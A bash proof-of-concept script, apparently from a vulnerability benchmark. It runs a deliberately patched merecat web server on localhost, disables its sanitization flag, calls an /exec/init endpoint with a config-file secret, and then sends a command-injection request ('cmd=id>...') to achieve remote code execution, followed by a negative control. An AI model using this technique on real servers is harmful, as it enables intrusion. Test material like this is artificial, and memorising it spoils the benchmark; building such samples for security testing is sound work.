#!/usr/bin/env bash
# PoC for 157_merecat_C3I2S3
# Axes: C3 (config file + runtime init) / I2 (snprintf buffer) / S3 (config-gated sanitization)
#
# S3 bypass: omit --strict-exec so sanitization is never activated.
# C3 flow: config sets exec_mode, exec_logging, exec_secret;
#          /exec/init?token=<secret> must be called first.
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (merecat) lives in this directory. If it is absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/merecat"
WWWROOT="/tmp/poc_157_www"
MARKER="/tmp/poc_157_marker"
CONF="/tmp/poc_157.conf"
PORT=18157
NEG_PORT=19157

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create config file with secret
cat > "$CONF" <<EOF
exec_mode = 1
exec_logging = 1
exec_secret = s3cr3t157
EOF

# ── start server WITHOUT --strict-exec (S3 bypass) ────────────────────────────
echo "[*] starting merecat with --exec-config (no --strict-exec) on port $PORT..."
"$BINARY" -n -p "$PORT" "$WWWROOT" --exec-config "$CONF" &
SERVER_PID=$!
sleep 2

# ── C3 step 1: initialize with correct token ───────────────────────────────────
echo "[*] calling /exec/init with correct token..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t157" > /dev/null

# ── C3 step 2: send exploit payload ───────────────────────────────────────────
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: without config file → gate disabled ─────────────────────
echo "[*] verifying gate: endpoint absent without --exec-config..."
"$BINARY" -n -p "$NEG_PORT" "$WWWROOT" &
NEG_PID=$!
sleep 2
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-config"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
